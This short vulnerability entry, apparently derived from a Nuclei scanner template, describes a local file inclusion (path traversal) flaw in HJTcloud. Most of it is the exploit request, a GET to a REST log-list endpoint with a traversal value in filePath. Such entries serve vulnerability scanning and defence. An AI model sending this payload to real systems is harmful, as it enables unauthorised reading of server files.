# Vulnerability: HJTcloud - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`hjtcloud-rest-arbitrary-file-read.yaml`)

## Description
HJTcloud is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../
```

